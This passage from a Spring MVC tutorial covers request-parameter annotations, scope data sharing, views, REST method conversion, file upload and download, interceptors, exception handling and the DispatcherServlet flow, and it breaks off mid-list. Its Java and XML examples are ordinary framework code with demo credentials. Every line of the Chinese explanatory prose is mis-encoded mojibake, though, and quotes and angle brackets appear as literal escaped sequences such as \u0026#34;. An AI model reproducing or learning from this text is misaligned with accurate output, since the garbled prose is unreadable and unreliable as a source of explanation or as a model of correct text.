@RequestParamæ˜¯å°†è¯·æ±‚å‚æ•°å’Œæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚åˆ›å»ºæ˜ å°„å…³ç³» @RequestParamæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼š valueï¼šæŒ‡å®šä¸ºå½¢å‚èµ‹å€¼çš„è¯·æ±‚å‚æ•°çš„å‚æ•°å requiredï¼šè®¾ç½®æ˜¯å¦å¿…é¡»ä¼ è¾“æ­¤è¯·æ±‚å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºtrue è‹¥è®¾ç½®ä¸ºtrueæ—¶ï¼Œåˆ™å½“å‰è¯·æ±‚å¿…é¡»ä¼ è¾“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°ï¼Œè‹¥æ²¡æœ‰ä¼ è¾“è¯¥è¯·æ±‚å‚æ•°ï¼Œä¸”æ²¡æœ‰è®¾ç½®defaultValueå±æ€§ï¼Œåˆ™é¡µé¢æŠ¥é”™400ï¼šRequired String parameter 'xxx' is not presentï¼›è‹¥è®¾ç½®ä¸ºfalseï¼Œåˆ™å½“å‰è¯·æ±‚ä¸æ˜¯å¿…é¡»ä¼ è¾“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°ï¼Œè‹¥æ²¡æœ‰ä¼ è¾“ï¼Œåˆ™æ³¨è§£æ‰€æ ‡è¯†çš„å½¢å‚çš„å€¼ä¸ºnull defaultValueï¼šä¸ç®¡requiredå±æ€§å€¼ä¸ºtrueæˆ–falseï¼Œå½“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°æ²¡æœ‰ä¼ è¾“æˆ–ä¼ è¾“çš„å€¼ä¸º\u0026quot;\u0026ldquo;æ—¶ï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼ä¸ºå½¢å‚èµ‹å€¼ ä½œç”¨å®é™…å°±æ˜¯æŒ‡å®šéœ€è¦ä¼ å…¥çš„å‚æ•°å¹¶è·å–ã€‚ 2.3 @RequestHeader @RequestHeaderæ˜¯å°†è¯·æ±‚å¤´ä¿¡æ¯å’Œæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚åˆ›å»ºæ˜ å°„å…³ç³» @RequestHeaderæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼švalueã€requiredã€defaultValueï¼Œç”¨æ³•åŒ@RequestParam è·å–è¯·æ±‚å¤´çš„ä¿¡æ¯ 2.4 @CookieValue @CookieValueæ˜¯å°†cookieæ•°æ®å’Œæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚åˆ›å»ºæ˜ å°„å…³ç³» @CookieValueæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼švalueã€requiredã€defaultValueï¼Œç”¨æ³•åŒ@RequestParam ä½œç”¨ä¸ºè·å–cookieçš„ä¿¡æ¯ã€‚ 2.5@RequestBody @RequestBodyå¯ä»¥è·å–è¯·æ±‚ä½“ï¼Œéœ€è¦åœ¨æ§åˆ¶å™¨æ–¹æ³•è®¾ç½®ä¸€ä¸ªå½¢å‚ï¼Œä½¿ç”¨@RequestBodyè¿›è¡Œæ ‡è¯†ï¼Œå½“å‰è¯·æ±‚çš„è¯·æ±‚ä½“å°±ä¼šä¸ºå½“å‰æ³¨è§£æ‰€æ ‡è¯†çš„å½¢å‚èµ‹å€¼\nå³è·å–ä¼ è¾“è¿‡æ¥çš„è¯·æ±‚ä½“éƒ¨åˆ† 1 2 3 4 5 6 // æ¯”å¦‚ä¼ è¾“çš„ username=admin password=123456 @RequestMapping(\u0026#34;/testRequestBody\u0026#34;) public String testRequestBody(@RequestBody String requestBody){ System.out.println(\u0026#34;requestBody:\u0026#34;+requestBody); return \u0026#34;success\u0026#34;; } åˆ™è¾“å‡ºç»“æœä¸ºï¼šrequestBody:username=admin\u0026amp;password=123456 RequestEntityå°è£…è¯·æ±‚æŠ¥æ–‡çš„ä¸€ç§ç±»å‹ï¼Œéœ€è¦åœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä¸­è®¾ç½®è¯¥ç±»å‹çš„å½¢å‚ï¼Œå½“å‰è¯·æ±‚çš„è¯·æ±‚æŠ¥æ–‡å°±ä¼šèµ‹å€¼ç»™è¯¥å½¢å‚ï¼Œå¯ä»¥é€šè¿‡getHeaders()è·å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œé€šè¿‡getBody()è·å–è¯·æ±‚ä½“ä¿¡æ¯\n1 2 requestHeader:[host:\u0026#34;localhost:8080\u0026#34;, connection:\u0026#34;keep-alive\u0026#34;, content-length:\u0026#34;27\u0026#34;, cache-control:\u0026#34;max-age=0\u0026#34;, sec-ch-ua:\u0026#34;\u0026#34; Not A;Brand\u0026#34;;v=\u0026#34;99\u0026#34;, \u0026#34;Chromium\u0026#34;;v=\u0026#34;90\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;90\u0026#34;\u0026#34;, sec-ch-ua-mobile:\u0026#34;?0\u0026#34;, upgrade-insecure-requests:\u0026#34;1\u0026#34;, origin:\u0026#34;http://localhost:8080\u0026#34;, user-agent:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\u0026#34;] requestBody:username=admin\u0026amp;password=123 2.6@ResponseBody @ResponseBodyç”¨äºæ ‡è¯†ä¸€ä¸ªæ§åˆ¶å™¨æ–¹æ³•ï¼Œå¯ä»¥å°†è¯¥æ–¹æ³•çš„è¿”å›å€¼ç›´æ¥ä½œä¸ºå“åº”æŠ¥æ–‡çš„å“åº”ä½“å“åº”åˆ°æµè§ˆå™¨\n1 2 3 4 5 @RequestMapping(\u0026#34;/testResponseBody\u0026#34;) @ResponseBody public String testResponseBody(){ return \u0026#34;success\u0026#34;; } ç»“æœï¼šæµè§ˆå™¨é¡µé¢æ˜¾ç¤ºå­—ç¬¦ä¸²success 2.7@RestController @RestControlleræ³¨è§£æ˜¯springMVCæä¾›çš„ä¸€ä¸ªå¤åˆæ³¨è§£ï¼Œæ ‡è¯†åœ¨æ§åˆ¶å™¨çš„ç±»ä¸Šï¼Œå°±ç›¸å½“äºä¸ºç±»æ·»åŠ äº†@Controlleræ³¨è§£ï¼Œå¹¶ä¸”ä¸ºå…¶ä¸­çš„æ¯ä¸ªæ–¹æ³•æ·»åŠ äº†@ResponseBodyæ³¨è§£ 3 SpirngMVCè·å–å‚æ•° ServletAPIè·å–:request.getParameter(\u0026quot;xx\u0026quot;);\n1 2 3 4 5 6 7 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(HttpServletRequest request){ String username = request.getParameter(\u0026#34;username\u0026#34;); String password = request.getParameter(\u0026#34;password\u0026#34;); System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } é€šè¿‡æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚è·å–è¯·æ±‚å‚æ•°\nåœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä½ç½®ï¼Œè®¾ç½®å’Œè¯·æ±‚å‚æ•°åŒåçš„å½¢å‚ï¼Œå½“æµè§ˆå™¨å‘é€è¯·æ±‚ï¼ŒåŒ¹é…åˆ°è¯·æ±‚æ˜ å°„æ—¶ï¼Œåœ¨DispatcherServletä¸­å°±ä¼šå°†è¯·æ±‚å‚æ•°èµ‹å€¼ç»™ç›¸åº”çš„å½¢å‚\n1 \u0026lt;a th:href=\u0026#34;@{/testParam(username=\u0026#39;admin\u0026#39;,password=123456)}\u0026#34;\u0026gt;æµ‹è¯•è·å–è¯·æ±‚å‚æ•°--\u0026gt;/testParam\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; 1 2 3 4 5 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(String username, String password){ System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } å¦‚æœåŒåçš„å‚æ•°è¿‡å¤šï¼Œå¯ä»¥å°†å…¶è®¾ç½®ä¸ºæ•°ç»„ï¼Œè¿™æ ·æ•°ç»„å†…çš„æ¯ä¸€ä¸ªå…ƒç´ å‡ä¸ºæ•°æ®ï¼Œå¦‚æœä¸è®¾ç½®æ•°ç»„ï¼Œåˆ™å­—ç¬¦å°†ä¼ å…¥çš„æ•°æ®ç”¨,è¿›è¡Œåˆ†éš”\né€šè¿‡POJOè·å–è¯·æ±‚å‚æ•°\nåœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä½ç½®è®¾ç½®ä¸€ä¸ªå®ä½“ç±»ç±»å‹çš„å½¢å‚ï¼Œæ­¤æ—¶è‹¥æµè§ˆå™¨ä¼ è¾“çš„è¯·æ±‚å‚æ•°çš„å‚æ•°åå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸€è‡´ï¼Œé‚£ä¹ˆè¯·æ±‚å‚æ•°å°±ä¼šä¸ºæ­¤å±æ€§èµ‹å€¼\nç±»Userä¸­çš„å±æ€§åå¯¹åº”æäº¤çš„æ•°æ® 1 2 3 4 5 6 @RequestMapping(\u0026#34;/testpojo\u0026#34;) public String testPOJO(User user){ System.out.println(user); return \u0026#34;success\u0026#34;; } //æœ€ç»ˆç»“æœ--\u0026gt;User{id=null, username=\u0026#39;å¼ ä¸‰\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;} è§£å†³ä¹±ç é—®é¢˜\nå¯ä»¥åœ¨web.xmlé‡Œé¢æ³¨å†Œç¼–ç è¿‡æ»¤å™¨CharacterEncodingFilterï¼Œå…·ä½“æ“ä½œè¯¦æƒ…æŸ¥çœ‹ä¸Šè¿°çš„web.xmlæ–‡ä»¶ SpringMVCä¸­å¤„ç†ç¼–ç çš„è¿‡æ»¤å™¨ä¸€å®šè¦é…ç½®åˆ°å…¶ä»–è¿‡æ»¤å™¨ä¹‹å‰ï¼Œå¦åˆ™æ— æ•ˆ 4 åŸŸå¯¹è±¡å…±äº«æ•°æ® 4.1 requeståŸŸ ä½¿ç”¨ServletAPIå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 @RequestMapping(\u0026#34;/testServletAPI\u0026#34;) public String testServletAPI(HttpServletRequest request){ request.setAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,servletAPI\u0026#34;); return \u0026#34;success\u0026#34;; } ä½¿ç”¨ModelAndViewå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @RequestMapping(\u0026#34;/testModelAndView\u0026#34;) public ModelAndView testModelAndView(){ /** * ModelAndViewæœ‰Modelå’ŒViewçš„åŠŸèƒ½ * Modelä¸»è¦ç”¨äºå‘è¯·æ±‚åŸŸå…±äº«æ•°æ® * Viewä¸»è¦ç”¨äºè®¾ç½®è§†å›¾ï¼Œå®ç°é¡µé¢è·³è½¬ */ ModelAndView mav = new ModelAndView(); //å‘è¯·æ±‚åŸŸå…±äº«æ•°æ® mav.addObject(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelAndView\u0026#34;); //è®¾ç½®è§†å›¾ï¼Œå®ç°é¡µé¢è·³è½¬ mav.setViewName(\u0026#34;success\u0026#34;); return mav; } ä½¿ç”¨Modelå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\nmodelæ–¹å¼ç”¨çš„æ¯”è¾ƒå¤š 1 2 3 4 5 @RequestMapping(\u0026#34;/testModel\u0026#34;) public String testModel(Model model){ model.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Model\u0026#34;); return \u0026#34;success\u0026#34;; } ä½¿ç”¨mapå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 @RequestMapping(\u0026#34;/testMap\u0026#34;) public String testMap(Map\u0026lt;String, Object\u0026gt; map){ map.put(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Map\u0026#34;); return \u0026#34;success\u0026#34;; } ä½¿ç”¨ModelMapå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 @RequestMapping(\u0026#34;/testModelMap\u0026#34;) public String testModelMap(ModelMap modelMap){ modelMap.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelMap\u0026#34;); return \u0026#34;success\u0026#34;; } Modelã€ModelMapã€Mapçš„å…³ç³»\n1 2 3 4 public interface Model{} public class ModelMap extends LinkedHashMap\u0026lt;String, Object\u0026gt; {} public class ExtendedModelMap extends ModelMap implements Model {} public class BindingAwareModelMap extends ExtendedModelMap {} 4.2 sessionåŸŸ ç›´æ¥ä½¿ç”¨HttpSession\n1 2 3 4 5 @RequestMapping(\u0026#34;/testSession\u0026#34;) public String testSession(HttpSession session){ session.setAttribute(\u0026#34;testSessionScope\u0026#34;, \u0026#34;hello,session\u0026#34;); return \u0026#34;success\u0026#34;; } 4.3 applicationåŸŸ é€šè¿‡ServletContext application = session.getServletContext();æ¥æ·»åŠ å¯¹åº”çš„æ•°æ®\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testApplication\u0026#34;) public String testApplication(HttpSession session){ ServletContext application = session.getServletContext(); application.setAttribute(\u0026#34;testApplicationScope\u0026#34;, \u0026#34;hello,application\u0026#34;); return \u0026#34;success\u0026#34;; } 5 è§†å›¾ SpringMVCä¸­çš„è§†å›¾æ˜¯Viewæ¥å£ï¼Œè§†å›¾çš„ä½œç”¨æ¸²æŸ“æ•°æ®ï¼Œå°†æ¨¡å‹Modelä¸­çš„æ•°æ®å±•ç¤ºç»™ç”¨æˆ·\nSpringMVCè§†å›¾çš„ç§ç±»å¾ˆå¤šï¼Œé»˜è®¤æœ‰è½¬å‘è§†å›¾å’Œé‡å®šå‘è§†å›¾\nè§†å›¾æ­¥éª¤\nå½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°æ²¡æœ‰ä»»ä½•å‰ç¼€æ—¶ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè§†å›¾åç§°æ‹¼æ¥è§†å›¾å‰ç¼€å’Œè§†å›¾åç¼€æ‰€å¾—åˆ°çš„æœ€ç»ˆè·¯å¾„ï¼Œä¼šé€šè¿‡è½¬å‘çš„æ–¹å¼å®ç°è·³è½¬\nè¿™é‡Œä»¥thymeleafä¸ºä¾‹\n1 2 3 4 @RequestMapping(\u0026#34;/testHello\u0026#34;) public String testHello(){ return \u0026#34;hello\u0026#34;; } å½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°ä»¥\u0026quot;forward:\u0026quot;ä¸ºå‰ç¼€æ—¶ï¼Œåˆ›å»ºInternalResourceViewè§†å›¾ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¸ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè€Œæ˜¯ä¼šå°†å‰ç¼€\u0026quot;forward:\u0026quot;å»æ‰ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæœ€ç»ˆè·¯å¾„é€šè¿‡è½¬å‘çš„æ–¹å¼å®ç°è·³è½¬\n1 2 3 4 @RequestMapping(\u0026#34;/testForward\u0026#34;) public String testForward(){ return \u0026#34;forward:/testHello\u0026#34;; } å½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°ä»¥\u0026quot;redirect:\u0026quot;ä¸ºå‰ç¼€æ—¶ï¼Œåˆ›å»ºRedirectViewè§†å›¾ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¸ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè€Œæ˜¯ä¼šå°†å‰ç¼€\u0026quot;redirect:\u0026quot;å»æ‰ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæœ€ç»ˆè·¯å¾„é€šè¿‡é‡å®šå‘çš„æ–¹å¼å®ç°è·³è½¬\n1 2 3 4 @RequestMapping(\u0026#34;/testRedirect\u0026#34;) public String testRedirect(){ return \u0026#34;redirect:/testHello\u0026#34;; } 6 Restful å®ƒä»¬åˆ†åˆ«å¯¹åº”å››ç§åŸºæœ¬æ“ä½œï¼šGET ç”¨æ¥è·å–èµ„æºï¼ŒPOST ç”¨æ¥æ–°å»ºèµ„æºï¼ŒPUT ç”¨æ¥æ›´æ–°èµ„æºï¼ŒDELETE ç”¨æ¥åˆ é™¤èµ„æºã€‚\nREST é£æ ¼æå€¡ URL åœ°å€ä½¿ç”¨ç»Ÿä¸€çš„é£æ ¼è®¾è®¡ï¼Œä»å‰åˆ°åå„ä¸ªå•è¯ä½¿ç”¨æ–œæ åˆ†å¼€ï¼Œä¸ä½¿ç”¨é—®å·é”®å€¼å¯¹æ–¹å¼æºå¸¦è¯·æ±‚å‚æ•°ï¼Œè€Œæ˜¯å°†è¦å‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®ä½œä¸º URL åœ°å€çš„ä¸€éƒ¨åˆ†ï¼Œä»¥ä¿è¯æ•´ä½“é£æ ¼çš„ä¸€è‡´æ€§ã€‚\næ“ä½œ ä¼ ç»Ÿæ–¹å¼ RESTé£æ ¼ æŸ¥è¯¢æ“ä½œ getUserById?id=1 user/1\u0026ndash;\u0026gt;getè¯·æ±‚æ–¹å¼ ä¿å­˜æ“ä½œ saveUser user\u0026ndash;\u0026gt;postè¯·æ±‚æ–¹å¼ åˆ é™¤æ“ä½œ deleteUser?id=1 user/1\u0026ndash;\u0026gt;deleteè¯·æ±‚æ–¹å¼ æ›´æ–°æ“ä½œ updateUser user\u0026ndash;\u0026gt;putè¯·æ±‚æ–¹å¼ SpringMVCç»™äºˆè§£å†³æ–¹æ¡ˆ\nSpringMVC æä¾›äº† HiddenHttpMethodFilter å¸®åŠ©æˆ‘ä»¬å°† POST è¯·æ±‚è½¬æ¢ä¸º DELETE æˆ– PUT è¯·æ±‚\nå½“å‰è¯·æ±‚çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºpost å½“å‰è¯·æ±‚å¿…é¡»ä¼ è¾“è¯·æ±‚å‚æ•°_method åœ¨web.xmlé‡Œé¢æ‰¾æ³¨å†Œ\n1 2 3 4 5 6 7 8 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.HiddenHttpMethodFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; å¯¹åº”æäº¤è¿‡æ¥çš„è¯·æ±‚ä¸­åº”è¯¥åŒ…å«å‚æ•°\nå‚æ•°åï¼š_method value:PUT or DELETE ä¼ è¾“çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºPOST 7 æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ æ–‡ä»¶ä¸‹è½½\nä½¿ç”¨ResponseEntityå®ç°ä¸‹è½½æ–‡ä»¶çš„åŠŸèƒ½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // å®é™…ä½¿ç”¨çš„æ—¶å€™ï¼Œå°†éœ€è¦ä¸‹è½½çš„è·¯å¾„ä½œä¸ºå‚æ•°ä¼ é€’å³å¯ @RequestMapping(\u0026#34;/testDown\u0026#34;) public ResponseEntity\u0026lt;byte[]\u0026gt; testResponseEntity(HttpSession session) throws IOException { //è·å–ServletContextå¯¹è±¡ ServletContext servletContext = session.getServletContext(); //è·å–æœåŠ¡å™¨ä¸­æ–‡ä»¶çš„çœŸå®è·¯å¾„ String realPath = servletContext.getRealPath(\u0026#34;/static/img/1.jpg\u0026#34;); //åˆ›å»ºè¾“å…¥æµ InputStream is = new FileInputStream(realPath); //åˆ›å»ºå­—èŠ‚æ•°ç»„ byte[] bytes = new byte[is.available()]; //å°†æµè¯»åˆ°å­—èŠ‚æ•°ç»„ä¸­ is.read(bytes); //åˆ›å»ºHttpHeaderså¯¹è±¡è®¾ç½®å“åº”å¤´ä¿¡æ¯ MultiValueMap\u0026lt;String, String\u0026gt; headers = new HttpHeaders(); //è®¾ç½®è¦ä¸‹è½½æ–¹å¼ä»¥åŠä¸‹è½½æ–‡ä»¶çš„åå­— headers.add(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment;filename=1.jpg\u0026#34;); //è®¾ç½®å“åº”çŠ¶æ€ç  HttpStatus statusCode = HttpStatus.OK; //åˆ›å»ºResponseEntityå¯¹è±¡ ResponseEntity\u0026lt;byte[]\u0026gt; responseEntity = new ResponseEntity\u0026lt;\u0026gt;(bytes, headers, statusCode); //å…³é—­è¾“å…¥æµ is.close(); return responseEntity; } æ–‡ä»¶ä¸Šä¼ \næ–‡ä»¶ä¸Šä¼ è¦æ±‚formè¡¨å•çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºpostï¼Œå¹¶ä¸”æ·»åŠ å±æ€§enctype=\u0026quot;multipart/form-data\u0026quot;\nSpringMVCä¸­å°†ä¸Šä¼ çš„æ–‡ä»¶å°è£…åˆ°MultipartFileå¯¹è±¡ä¸­ï¼Œé€šè¿‡æ­¤å¯¹è±¡å¯ä»¥è·å–æ–‡ä»¶ç›¸å…³ä¿¡æ¯\næ­¥éª¤\næ·»åŠ ä¾èµ–\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨SpringMVC.xmlé‡Œé¢æ³¨å†Œç»„ä»¶\n1 2 \u0026lt;!--å¿…é¡»é€šè¿‡æ–‡ä»¶è§£æå™¨çš„è§£ææ‰èƒ½å°†æ–‡ä»¶è½¬æ¢ä¸ºMultipartFileå¯¹è±¡--\u0026gt; \u0026lt;bean id=\u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; å®é™…æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @RequestMapping(\u0026#34;/testUp\u0026#34;) public String testUp(MultipartFile photo, HttpSession session) throws IOException { //è·å–ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶å String fileName = photo.getOriginalFilename(); //å¤„ç†æ–‡ä»¶é‡åé—®é¢˜ String hzName = fileName.substring(fileName.lastIndexOf(\u0026#34;.\u0026#34;)); fileName = UUID.randomUUID().toString() + hzName; //è·å–æœåŠ¡å™¨ä¸­photoç›®å½•çš„è·¯å¾„ ServletContext servletContext = session.getServletContext(); String photoPath = servletContext.getRealPath(\u0026#34;photo\u0026#34;); File file = new File(photoPath); if(!file.exists()){ file.mkdir(); } String finalPath = photoPath + File.separator + fileName; //å®ç°ä¸Šä¼ åŠŸèƒ½ photo.transferTo(new File(finalPath)); return \u0026#34;success\u0026#34;; } 8 æ‹¦æˆªå™¨ SpringMVCä¸­çš„æ‹¦æˆªå™¨æœ‰ä¸‰ä¸ªæŠ½è±¡æ–¹æ³•ï¼š preHandleï¼šæ§åˆ¶å™¨æ–¹æ³•æ‰§è¡Œä¹‹å‰æ‰§è¡ŒpreHandle()ï¼Œå…¶booleanç±»å‹çš„è¿”å›å€¼è¡¨ç¤ºæ˜¯å¦æ‹¦æˆªæˆ–æ”¾è¡Œï¼Œè¿”å›trueä¸ºæ”¾è¡Œï¼Œå³è°ƒç”¨æ§åˆ¶å™¨æ–¹æ³•ï¼›è¿”å›falseè¡¨ç¤ºæ‹¦æˆªï¼Œå³ä¸è°ƒç”¨æ§åˆ¶å™¨æ–¹æ³• postHandleï¼šæ§åˆ¶å™¨æ–¹æ³•æ‰§è¡Œä¹‹åæ‰§è¡ŒpostHandle() afterComplationï¼šå¤„ç†å®Œè§†å›¾å’Œæ¨¡å‹æ•°æ®ï¼Œæ¸²æŸ“è§†å›¾å®Œæ¯•ä¹‹åæ‰§è¡ŒafterComplation() å¤šä¸ªæ‹¦æˆªå™¨ä¸€èµ·å·¥ä½œçš„æ—¶å€™ preHandleä¹‹å‰çš„é¡ºåºæŒ‰ç…§SpringMVC.xmlé‡Œé¢ç»„ä»¶æ³¨å†Œçš„å…ˆåé¡ºåºæ‰§è¡Œï¼Œå¹¶ç›¸å½“äºä»¥æ ˆçš„å½¢å¼å‹å…¥ã€‚ åé¢çš„æŒ‰ç…§å‡ºæ ˆçš„å½¢å¼æ‰§è¡Œã€‚ å¦‚æœä¸€ä¸ªæ‹¦æˆªå™¨çš„preHandleè¿”å›falseï¼Œåˆ™å…¶ä¹‹åçš„æ‹¦æˆªå™¨çš„éƒ½ä¸ä¼šæ‰§è¡Œï¼ŒpostHandle()éƒ½ä¸æ‰§è¡Œï¼Œè¿”å›falseçš„æ‹¦æˆªå™¨ä¹‹å‰çš„æ‹¦æˆªå™¨çš„afterComplation()ä¼šæ‰§è¡Œ 9 å¼‚å¸¸å¤„ç† SpringMVCæä¾›äº†è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å™¨SimpleMappingExceptionResolverï¼Œä½¿ç”¨æ–¹å¼ï¼š\nåŸºäºæ³¨è§£\n1 2 3 4 5 6 7 8 9 10 11 12 13 //@ControllerAdviceå°†å½“å‰ç±»æ ‡è¯†ä¸ºå¼‚å¸¸å¤„ç†çš„ç»„ä»¶ @ControllerAdvice public class ExceptionController { //@ExceptionHandlerç”¨äºè®¾ç½®æ‰€æ ‡è¯†æ–¹æ³•å¤„ç†çš„å¼‚å¸¸ @ExceptionHandler(ArithmeticException.class) //exè¡¨ç¤ºå½“å‰è¯·æ±‚å¤„ç†ä¸­å‡ºç°çš„å¼‚å¸¸å¯¹è±¡ public String handleArithmeticException(Exception ex, Model model){ model.addAttribute(\u0026#34;ex\u0026#34;, ex); return \u0026#34;error\u0026#34;; } } 10 SpringMVCæ‰§è¡Œæµç¨‹ ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¯·æ±‚è¢«SpringMVC å‰ç«¯æ§åˆ¶å™¨ DispatcherServletæ•è·ã€‚\nDispatcherServletå¯¹è¯·æ±‚URLè¿›è¡Œè§£æï¼Œå¾—åˆ°è¯·æ±‚èµ„æºæ ‡è¯†ç¬¦ï¼ˆURIï¼‰ï¼Œåˆ¤æ–­è¯·æ±‚URIå¯¹åº”çš„æ˜ å°„ï¼š\na) ä¸å­˜åœ¨\ni. å†åˆ¤æ–­æ˜¯å¦é…ç½®äº†mvc:default-servlet-handler ii. å¦‚æœæ²¡é…ç½®ï¼Œåˆ™æ§åˆ¶å°æŠ¥æ˜ å°„æŸ¥æ‰¾ä¸åˆ°ï¼Œå®¢æˆ·ç«¯å±•ç¤º404é”™è¯¯ iii. å¦‚æœæœ‰é…ç½®ï¼Œåˆ™è®¿é—®ç›®æ ‡èµ„æºï¼ˆä¸€èˆ¬ä¸ºé™æ€èµ„æºï¼Œå¦‚ï¼šJS,CSS,HTML)ï¼Œæ‰¾ä¸åˆ°å®¢æˆ·ç«¯ä¹Ÿä¼šå±•ç¤º404é”™è¯¯ b) å­˜åœ¨åˆ™æ‰§è¡Œä¸‹é¢çš„æµç¨‹\næ ¹æ®è¯¥URIï¼Œè°ƒç”¨HandlerMappingè·å¾—è¯¥Handleré…ç½®çš„æ‰€æœ‰ç›¸å…³çš„å¯¹è±¡ï¼ˆåŒ…æ‹¬Handlerå¯¹è±¡ä»¥åŠHandlerå¯¹è±¡å¯¹åº”çš„æ‹¦æˆªå™¨ï¼‰ï¼Œæœ€åä»¥HandlerExecutionChainæ‰§è¡Œé“¾å¯¹è±¡çš„å½¢å¼è¿”å›ã€‚\nDispatcherServlet æ ¹æ®è·å¾—çš„Handlerï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„HandlerAdapterã€‚\nå¦‚æœæˆåŠŸè·å¾—HandlerAdapterï¼Œæ­¤æ—¶å°†å¼€å§‹æ‰§è¡Œæ‹¦æˆªå™¨çš„preHandler(â€¦)æ–¹æ³•ã€æ­£å‘ã€‘\næå–Requestä¸­çš„æ¨¡å‹æ•°æ®ï¼Œå¡«å……Handlerå…¥å‚ï¼Œå¼€å§‹æ‰§è¡ŒHandlerï¼ˆController)æ–¹æ³•ï¼Œå¤„ç†è¯·æ±‚ã€‚åœ¨å¡«å……Handlerçš„å…¥å‚è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®ä½ çš„é…ç½®ï¼ŒSpringå°†å¸®ä½ åšä¸€äº›é¢å¤–çš„å·¥ä½œï¼š\na) HttpMessageConveterï¼š 